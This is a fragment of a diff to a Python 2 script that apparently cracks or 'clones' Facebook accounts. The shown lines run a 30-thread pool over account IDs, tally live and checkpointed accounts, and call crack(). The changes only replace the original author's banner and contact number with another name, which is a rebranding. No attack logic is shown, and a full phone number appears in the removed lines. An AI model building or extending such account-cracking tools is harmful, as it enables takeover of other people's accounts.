-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mARJUN-DEV\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By ARJUN-DEV--•◈•---»" #Dev:arjun-dev
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
@@ -3032,7 +3015,7 @@ Don't Worry Your Checkpoint ID Will Be Open After 7 Days
 : \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +880******"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -3232,8 +3215,8 @@ def pilih_army():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mARJUN-DEV\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By ARJUN-DEV-•◈•---»" #Dev:ARJUN-DEV
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
@@ -3244,7 +3227,7 @@ Don't Worry Your Checkpoint ID Will Be Open After 7 Days
 : \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +8801******"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
